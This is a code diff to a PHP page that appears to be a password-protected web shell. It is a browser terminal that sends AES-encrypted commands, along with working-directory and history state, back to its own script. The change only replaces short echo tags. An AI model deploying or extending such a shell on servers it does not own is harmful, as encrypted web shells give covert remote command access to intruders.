@@ -39,7 +39,7 @@ header("Content-Security-Policy: default-src 'none'; connect-src 'self'; script-
 header("Content-type: text/html; charset=utf-8");
 ?>
 <!DOCTYPE html>
-<html lang="en"><head><title><?=htmlspecialchars($_SERVER['HTTP_HOST'])?></title>
+<html lang="en"><head><title><?php echo htmlspecialchars($_SERVER['HTTP_HOST'])?></title>
 <style>body{margin:0;padding:1%}input,textarea{font-family:monospace;font-size:12px;padding:1%;width:98%}</style>
 </head><body>
 <textarea rows="20" cols="100" id="s" readonly="readonly"></textarea><input id="c" size="100"/>
@@ -101,14 +101,14 @@ d[c],v=Sha256.Sigma0(l)+Sha256.Maj(l,n,p);t=r;r=q;q=m;m=s+u&4294967295;s=p;p=n;n
             return;
         }
         var x=new XMLHttpRequest();
-        x.open('POST','<?=$_SERVER['PHP_SELF']?>',true);
+        x.open('POST','<?php echo $_SERVER['PHP_SELF']?>',true);
         x.onreadystatechange = ((function(x,salt){return function(){ready.call(x,salt)}})(x,salt));
         x.setRequestHeader("Content-Type", 'application/x-www-form-urlencoded');
         x.send('salt='+encodeURIComponent(salt)
             +'&data='+encodeURIComponent(Aes.Ctr.encrypt(JSON.stringify(data), Sha256.hash(salt+pw), 256)));
         _('s').value += '$ '+_('c').value+"\n";
     }
-    var password = false, cwd = false, history = [], current = 0, timeDelta=Math.round((new Date).getTime()/1000-<?=time()?>);
+    var password = false, cwd = false, history = [], current = 0, timeDelta=Math.round((new Date).getTime()/1000-<?php echo time()?>);
     function getPassword() {
         if (password) return password;
         var c = prompt('Enter a password:');
